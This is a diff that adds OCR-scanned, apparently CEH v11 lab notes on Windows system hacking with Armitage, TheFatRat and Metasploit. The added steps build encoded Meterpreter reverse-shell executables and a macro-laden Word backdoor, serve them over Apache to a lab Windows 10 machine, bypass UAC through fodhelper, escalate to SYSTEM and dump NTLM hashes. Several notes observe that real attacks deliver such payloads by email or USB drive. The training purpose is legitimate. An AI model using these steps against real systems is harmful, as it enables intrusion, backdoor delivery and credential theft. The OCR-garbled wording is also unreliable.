@@ -108,9 +108,203 @@ permissions, unattended install ftles, and older locations.
 Note: Attackers exploit misconfigured services such as unquoted service paths, service object permissions, tmattended installs, modifiable registry
 autoruns and configurations, and oilier locations to elevate access privileges.
 After establishing an active session using Metasploit, attackers use tools such as PowerSploit to detect misconfigured services iliat exist in ilie target OS.
-31. Now, type exit and press Enter to revert to ilie Meterpreter session.
+31. Now, type exit and press Enter to revert to the Meterpreter session.
 32. Now, exploit VNC vulnerability to gain remote access to the Windows 10 virtual machine. Todo so, type run vnc and press Enter.
 This will open a VNC session for d1e target machine, as shown in the screenshot. Using this session, you can see the victim's activities on the system, including the files, 
 websites, software, and other resources the user opens or runs.
 
 Armitage
+In a terminal sudo su
+type service postgresql start and press Enter to start the database service.
+Click Applications in the top-left comer of Desktop and navigate to
+Pentesting -> Exploitation Tools -> Metasploit Framework -> armitage to launch the Annitage tool.
+The Connect ... pop-up appears; leave the settings to default and click the Connect button
+The Start Metasploit? pop-up appears; click Yes.
+10. The Progress ... pop-up appears. After the loading completes, the Armitage main window appears, as shown in the screenshot.
+Click on Hosts from the Menu bar and navigate to Nmap Sean -> lntense Sean to sean for live hosts in the network.
+The Input pop-up appears. Type a target IP address (here, 10.10.10.10) and click OK
+After wrutmg for the sean to complete, a Message pop-up appears, displaying the Scan Complete! message; click OK.
+Observe that the target host (10.10.10.10) appears on the screen, as shown in the screenshot
+Now, from the left-hand pane, expand the payload node, and then navigate to windows -> meterpreter; double-click meterpreter_reverse_tcp.
+The windowslmeterpreter_reverse_tcp window appears. Scroll clown to the LPORT Option, and change the port Value to 444. In the Output field, select
+exe from the drop-down options; click Launch.
+The Save window appears. Select Desktop as the location, set the File Name as malicious_payload.exe, and click the Save button.
+A Message pop-up appears; click OK
+19. Now, switch to the Tenninal window, type cp /root/Desktop/malicious_payload.exe /var/www/html/share/, and press Enter
+to copy the ftle to the shared folder.
+20. Type service apache2 start and press Enter to start the Apache server.
+Now, in the left-hand pane, double-click meterpreter_reverse_tcp
+The windowslmeterpreter_reverse_tcp window appears. Scroll down to LPORT Option and change the port Value to 444. Ensure that the
+multi/handler option is selected in the Output field; click Launch.
+Now, switch to the Windows 10 virtual machine and open any web browser (here, Mozilla Firefox). In the address bar, type
+http://10.10.10.13/share and press Enter. As soon as you press enter, the system will display the shared folder contents, as shown in the screenshot.
+Note: Here, we are sending the malicious payload through a shared directory; however, in real-time, you can send it via an attachment in an email or through
+physical means such as a hard drive or pen drive.
+24. Click malicious_payload.exe to download the file.
+Note: 10.10.10.13 is the IP address of the host machine (here, the Parrot Security virtual machine).
+Once you click on the malicious_payload.exe file, the Opening malicious_payload.exe pop-up appears; select Save File.
+26. The malicious file will be downloaded to the browser's default download location (here, Downloads). Now, double-click malicious_payload.exe to run the file.
+Observe that one session has been created or opened in the Meterpreter shell, as shown in the screenshot, and the host icon displays the target system name (WINDOWS10)
+Right-click on the target host and na viga teto Meterpreter 1 -> lnteract -> Meterpreter Shell
+A new Meterpreter 1 tab appears. Type sysinfo and press Enter to view the system details of the exploited system, as shown in the screenshot
+Right-click on d1e target host and navigate to Meterpreter 1 -> Explore -> Browse Files .
+A new Files 1 tab and the present working directory of the target system appear. You can observe the files present in d1e Download folder of the target system.
+34. Usingthis option, you can perform various functions such as uploading a file, making a directory, and listing all drives present in the target system
+Right-click on the target host and navigate to Meterpreter 1 -> Explore -> Screenshot.
+A new Screenshot 1 tab appears, displaying the currenti y open windows in the target system .
+Similarly, you can explore other options such as Desktop (VNC), Show Processes, Log Keystrokes, and Webcam Shot.
+38. You can also escalare privileges in tl1e target system using the Escalate Pñvileges option and furtl1er steal tokens, dump hashes, or perform other acttv1t1es.
+
+TheFatRat
+
+T11e Windows shares on 10.10.10.10 window appears; navigate to the location CEH-Tools/CEHv11 Module 06 System Hacking/GitHub Tools/ and copy the TheFatRat folder.
+Paste the copied TheFatRat folder on rl1e location /home/attacker/ .
+In the terminal window, type mv /home/attacker/TheFatRat /root/ .
+6. After the cloning completes, type cd TheFatRat and press Enter.
+7. Type ls and press Enter to view rl1e files in the TheFatRat folder
+Now, to nm the scripts (fatrat, setup.sh, powerfull.sh) located in TheFatRat folder, we must give them access permissions. To do so, use the below
+commands:
+• chmod +x fatrat and Enter
+• chmod +x ./setup.sh and Enter
+• chmod +x ./powerfull.sh and Enter
+Type ./setup.sh and hit Enter to begin the installation. Press Enter when the Press [ENTER] key to continue setup message appears
+An installation window appears as the system installs the required packages to run TheFatRat.
+Note: The installation of packages takes approximately 5 minutes to complete.
+Note: If a pop-up asking for permission appears, use the arrow keys (<-->) on the keyboard to navigate to Y es and press Enter to continue
+After the installation completes, the Terminal window appears. Under Select one of the options bellow, type 2 to choose the [2] lnstall Searchsploit
+from Kali Repository option and press Enter.
+Under the prompt, so you can run fatrat from anywhere in your terminal and desktop ?, type y and press Enter
+After the installation finishes, in the Terminal window, type fatrat and press Enter
+TheFatRat launches and starts to verify the installed dependencies, as shown in the screenshot
+A Warning appears, as shown in the screenshot Press Enter to continue
+The Metasploit service is not running message appears; press Enter to continue
+You may get multiple prompts saying Press [Enter] key to Continue ••• , do so to continue
+TheFatRat menu appears; choose [06] Create Fud Backdoor 1000% with PwnWinds [Excelent] by typing 6 in the menu and pressing Enter
+The PwnWinds menu appears. Choose [3] Create exe file with apache + Powershell (FUD 100%) by typing 3 in the menu and pressing Enter
+For Set LHOST IP, type 10.10.10.13 and press Enter.
+21. For Set LPORT, type 4444 and press Enter.
+22. For the Please enter the base name for output files option, type payload and press Enter
+For the Choose Payload option, choose [ 3 ] windows/meterpreter/reverse_tcp by typing 3 and pressing Enter
+The details about the generated payload appear and are saved at the location /root/TheFatRat_Generated. Press Enter to continue
+TheFatRat generates a payload.exe file located at root/Fatrat_Generated, as shown in the screenshot.
+Now, to go back to the main menu, choose [9] Back to Menu by typing 9 and press Enter.
+From the menu, choose [07] Create Backdoor For Office with Microsploit by typing 7 and press Enter.
+The Microsploit menu appears; choose option 2 The Microsoft Office Macro on Windows by typing 2 and press Enter.
+For Set LHOST IP, type 10.10.10.13 and press Enter.
+30. For rl1e Set LPORT optio n, type 4444 and hit Enter.
+31. For Enter the base name for output files, type BadDoc and press Enter.
+For Enter the message for the document body (ENTER = default) :, type YOU HAVE BEEN HACKED !! and press Enter.
+For the Are u want Use custom exe file backdoor (y/n) option, type y and press Enter.
+34. For the Path option, type /root/Fatrat_Generatedlpayload.exe and press Enter
+For the Choose Payload option, choose [ 3] windows/meterpreter/reverse_tcp by typing 3 and press Enter
+The malicious document det.ails appear, as shown in the screenshot. Press Enter to continue.
+Navigate to /root/Fatrat_Generated to find the generated document file (BadDoc.docm), as shown in the screenshot
+Now, open a new Terminal window and type cp /root/Fatrat_ Generated/BadDoc.docm /var/www/html/share to copy the
+generated malicious document to the shared folder.
+Note: Here, we are sending the malicious payload through a shared directory;
+but in real-time, you can send it via an attachment in the email or through physical means such as a hard drive or pen drive.
+39. Start the apache service. Todo this, type service apache2 start and press Enter.
+In the Terminal window, latmch Met.asploit by typing msfconsole and pressing Enter.
+41. In msfconsole, type use exploit/multilhandler and press Enter
+Now, we need to set the payload, LHOST, and LPORT. Todo so, use the below commands:
+• Type set payload windows/meterpreter/reverse_tcp and press Enter
+•Type set LHOST 10.10.10.13 and press Enter
+Type set LPORT 4444 and press Enter
+43. After entering the above details, type exploit and press Enter to start the listener.
+Switch to the Windows 10 virtual machine and open any web browser (here, Mozilla Firefox). In the address bar, type http:/110.10.10.13/share
+and press Enter. As soon as you press enter, the system will display the shared folder contents, as shown in the screenshot.
+45. Click BadDoc.docm to download the file.
+Note: 10.10.10.13 is the IP address of d1e host machine (here, d1e Parrot Security virtual machine).
+Once you click on the BadDoc.docm ftle, the Opening BadDoc.docm pop-up appears; select Save File.
+47. The malicious file will download to the browser's default download location (here, Downloads). Now, double-click the BadDoc.docm file to run it.
+A Microsoft Word document appears with the file in PROTECTED VIEW. Click Enable Editing, as shown in the screenshot
+A Microsoft Word document appears with the file in PROTECTED VIEW. Click Enable Editing, as shown in the screenshot
+Now, switch back to the Parrot Security virtual machine and observe that o ne session is created or o pened in the Meterpreter shell, as shown in the screenshot
+Type sysinfo and hit Enter to view the system details of the exploited computer, as shown in the screenshot.
+
+BeRoot
+
+In the terminal window, type msfvenom -p windows/meterpreter/reverse_tcp - platform windows -a x86 -e x86/shikata_ga_nai -b "\xOO" LHOST=10.10.10.13 -f exe >
+Desktop/Exploit.exe and press Enter.
+Note: Here, the IP address of the host machine is 10.10.10.13 (here, this IP is the Parrot Security virt ual machine).
+The above command will create a malicious Windows executable file named "Exploit.exe," which will be saved on the parrot Desktop, as shown in the screenshot
+Now, we need to share Exploit.exe with the victim machine. (In this lab, we are using Windows 10 as the victim machine).
+In the previous lab, we already created a directory or shared folder (share) at the location (tvar/www/html) wid1 the required access permission. So,
+we will use me same directory or shared folder (share) to share Exploit.exe with the victim machine.
+Note: If you want to crea te a new directory to share me Exploit.exe file with the target machine and provide me permissions, use me below commands:
+Type mkdir /varlwww/html/share and press Enter to create a shared folder
+Type chmod -R 755 /var/www/html/share and press Enter
+Type chown -R www-data:www-data /var/www/html/share and press Enter
+Note: Here, we are sending me malicious payload through a shared directory; but in real-time, you can send it as an emaii attachment or mrough physical
+means such as a hard drive or pen drive.
+11. Type ls -la /var/www/html/1 grep share and press Enter.
+12. To copy the Exploit.exe file into me shared folder, type cp /root/Desktop/Exploit.exe /var/www/html/share/ and press Enter.
+13. Type service apache2 start and press Enter to start me Apache server.
+Now, type msfconsole in d1e tenninal and press Enter to launch me Metasploit framework.
+15. Type use exploitlmulti/handler and press Enter to handle exploits launched outside me framework.
+16. Now, issue me following commands in msfconsole:
+Type set payload windows/meterpreter/reverse_tcp and press Enter to set a payload.
+Type set LHOST 10.10.10.13 and press Enter to set d1e localhost .
+To start the handler, type the command exploit -j -z and press Enter
+Now, switch to the Windows 10 virtual machine and log in with the credentials Admin/Pa$$w0rd.
+19. Open any web browser (here, Mozilla Firefox). In the address bar, type http://10.10.10.13/share and press Enter. As soon as you press enter, the
+system will display the shared folder contents, as shown in the screenshot.
+20. Click the Exploit.exe ftle to download the backdoor ftle.
+Note: 10.10.10.13 is the IP address of the host machine (here, the Parrot Security virtual machine).
+Leave the Windows 10 virtual machine running, so the Exploit.exe file runs in the background and switch to d1e Parrot Security virtual machine
+In the Terminal window, you can see that the Meterpreter session has successfully been opened.
+26. Type sessions -i 1 and press Enter (here, 1 is the id number of the session). Meterpreter shell is launched, as shown in the screenshot
+Type getuid and press Enter. This displays the current user ID, as shown in the screenshot
+Observe d1at d1e Meterpreter session is running with normal user privileges (WINDOWS10\Admin).
+29. Now that you have gained access to the target system with normal user privileges, your next task is to perform privilege escalation to attain
+higher-level privileges in the target system.
+30. First, we will use privilege escalation tools (BeRoot), which allow you to run a configuration assessment on a target system to find out infonnation
+about its underlying vulnerabilities, services, file and directory permissions, kernel version, architecture, as well as oilier data. Using this
+information, you can find a way to further exploit and elevate the privileges on the target system.
+Now, we will copy the BeRoot tool on the host machine (Parrot Security), and then upload ilie tool onto d1e target m achine (Windows 10) using the
+Meterpreter session
+Navigate to CEHv11 Module 06 System Hacking\Privilege EscalationTools and copy the BeRoot folder. Close the window.
+Paste the BeRoot folder onto Desktop
+Now, switch back to the Terminal window with an active meterpreter session. Type upload /home/attacker/Desktop/BeRootlbeRoot.exe and press Enter. 
+This command uploads the beRoot.exe file to the target system's present working directory (here, Downloads).
+Type shell and press Enter to open a shell session. Observe that the present working directory points to the Downloads folder in the target system.
+Type beRoot.exe and press Enter to run the BeRoot tool.
+41. A result appears, displaying information about service names along with their pennissions, keys, writable directories, locations, and other vital data.
+42. You can further scroll clown to view the information related to startup keys, task schedulers, \XlebClient vulnerabilities, and other items
+You can find further vulnerabilities in the resulting services and attempt
+to exploit them to escalate your privileges in the target system.
+N ote: Windows privileges can be used to escalated privileges. These privileges include SeDebug, SeRestore & SeBackup & SeTakeOwnership,
+SeTcb & SeCreateToken, SeLoadDriver, and Selmpersonate & SeAssignPrimaryToken. BeRoot lists all available privileges and highlights if you have one of these tokens.
+44. In the Terminal window with an active Meterpreter session, type exit and press Enter to navigate back to the Meterpreter session.
+Now, let us check our current system privileges by executing the run post/windows/gather/smart_hashdump command
+Now, we shall try to bypass ilie user account control setting d1at is
+blocking you from gaining tmrestricted access to the machine.
+Note: In this task, we will bypass Windows UAC protection via the FodHelper Registry Key. It is present in Metasploit as a bypassuac_fodhelper exploit.
+Type background and press Enter. This command moves the current Meterpreter session to the background.
+Now, we will use the bypassuac_fodhelper exploit for windows. To do so, type use exploit/windows/local/bypassuac_fodhelper and press Enter.
+55. Here, yo u need to configure the exploit. To know which options you need to configure in d1e exploit, type show options and press Enter. The
+Module options section appears, displaying the requirement for the exploit. Observe that d1e SESSION option is required, but d1e Current Setting is empty.
+Type set SESSION 1 (1 is the current Meterpreter session which is runnirlg in the background) and press Enter.
+Now that we have configured the exploit, our next step will be to set and configure a payload. To do so, type set payload windows/meterpreter/reverse_tcp and press Enter. 
+This will set the meterpreter/reverse_tcp payload
+The next step is to configure this payload. To see al! the options, you need to configure in d1e exploit, type show options and press Enter.
+59. The Module options section appears, displaying the previously configured exploit. Here, observe that the session value is set.
+60. The Payload options section displays the requirement for the payload. Observe that:
+The LHOST option is required, but Current Setting is empty here, you need to set d1e IP Address of d1e local host, (here, the Parrot Security virtual machine)
+The EXITFUNC option is required, but Current Setting is already set to process, so ignore this option The LPORT option is required, but Current Setting is already set to
+port number 4444, so ignore this option
+To set the LHOST option, type set LHOST 10.10.10.13 and press Enter.
+62. To set d1e TARGET option, type set TARGET O and press Enter here, O  indicates nothing, but the Exploit Target ID).
+Note: In this lab, 10.10.10.13 is the IP Address o f the attacker machine (here, Parrot Security), which might vary in your lab environment.
+You have successfully configured the exploit and payload. Type exploit and press Enter. This begins to exploit the UAC settings on the Windows 1O virtual machine.
+64. As you can see, the BypassUAC exploit has successfully bypassed the UAC setting on the Windows 10 virtual machine; you have now successfully completed a Meterpreter session.
+Now, let us check the current User ID status of Meterpreter by issuing the getuid command. You will observe that the Meterpreter server is still running with normal user privileges.
+At this stage, we shall re-issue the getsystem command with the -t 1 switch to elevate privileges. To do so, type getsystem -t 1 and press Enter
+If the command getsystem -t 1 does not run successfully, issue the command getsystem.
+67. This time, the command successfully escalates user privileges and returns a message stating got system, as shown in the screenshot
+Now, type getuid and press Enter. The Meterpreter session is now running with system privileges (NT AUTHORITY\SYSTEM), as shown in the screenshot
+Type the command run postlwindows/gather/smart_hashdump and press Enter. This time, Meterpreter successfully extracts the NTLM
+hashes and displays them, as shown in the screenshot.
+
+Hack a Windows Machine using Metasploit and Perform PostExploitation using Meterpreter
+
